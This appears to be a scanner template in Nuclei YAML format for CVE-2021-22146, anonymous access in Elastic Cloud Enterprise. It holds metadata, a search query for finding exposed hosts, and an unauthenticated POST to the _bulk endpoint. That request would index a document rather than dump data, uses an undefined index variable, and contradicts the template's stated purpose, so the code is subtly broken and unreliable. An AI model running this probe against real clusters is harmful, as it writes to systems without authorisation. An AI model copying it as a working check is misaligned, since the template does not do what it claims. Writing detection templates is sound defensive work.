id: CVE-2021-22146

info:
  name: Elasticsearch ECE Anonymous Database Dump
  author: ProjectDiscoveryAI
  severity: high
  description: All versions of Elastic Cloud Enterprise has the Elasticsearch “anonymous” user enabled by default in deployed clusters. This vulnerability allows unauthorized access to sensitive data stored in the Elasticsearch database.
  impact: |
    High: Potential exposure of sensitive data stored in the Elasticsearch database.
  remediation: |
    Apply the necessary patches provided by Elasticsearch to mitigate CVE-2021-22146.
  reference:
    - https://security.netapp.com/advisory/ntap-20210819-0005/
    - https://github.com/manas3c/CVE-POC
    - https://github.com/n0-traces/cve_monitor
    - https://github.com/nomi-sec/PoC-in-GitHub
    - https://github.com/k0mi-tg/CVE-POC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-22146
    epss-score: 0.03976
    epss-percentile: 0.92341
    cpe: cpe:2.3:a:elastic:elasticsearch:7.13.3:*:*:*:*:*:*:*
  metadata:
    vendor: elastic
    product: elasticsearch
    fofa-query: index_not_found_exception

http:
  - method: POST
    path:
      - "{{BaseURL}}/_bulk"

    body: |
      { "index": "{{index}}" }
      { "query": { "match_all": {} }, "from": 0, "size": 1000 }

    headers:
      Content-Type: application/json
    matchers:
      - type: word
        words:
          - '"took":'
          - '"errors":false'
        condition: and
